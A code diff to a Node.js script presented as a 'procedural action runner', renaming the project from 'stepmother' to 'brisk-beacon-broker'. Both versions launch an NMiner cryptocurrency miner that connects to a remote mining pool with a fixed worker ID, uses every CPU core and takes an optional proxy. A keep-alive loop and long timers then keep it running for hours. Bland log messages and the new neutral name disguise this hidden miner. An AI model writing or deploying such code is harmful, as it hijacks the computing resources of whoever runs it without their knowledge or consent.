@@ -1,32 +1,29 @@
-// Procedural action runner for stepmother
+// Procedural action runner for brisk-beacon-broker
 const os = require("os");
-const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-const dispatcher = new EventEmitter();
+function createRuntimeContext() {
+    const runId = "f9fc4c";
+    console.log(`[worker] Instantiated runtime context for brisk-beacon-broker [${runId}]`);
 
-dispatcher.once("start", () => {
-    const runId = "877b8d";
-    console.log(`[supervisor] Subsystem dispatched for stepmother [${runId}]`);
-
-    const pipeline = new NMiner(
+    const service = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.stepmother",
-        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
+        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
     );
 
-    const keepAlivePromise = new Promise(() => {});
+    const tick = () => { setTimeout(tick, 87000); }; tick();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (319m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (347m) reached, exiting cleanly.");
         process.exit(0);
-    }, 319 * 60 * 1000);
+    }, 347 * 60 * 1000);
 
     process.on("SIGTERM", () => {
         
-        console.log(`[exit] Process terminated gracefully for token ${runId}.`);
+        console.log("[halt] Clean lifecycle exit confirmed.");
         process.exit(0);
     });
-});
+}
 
-dispatcher.emit("start");
+createRuntimeContext();
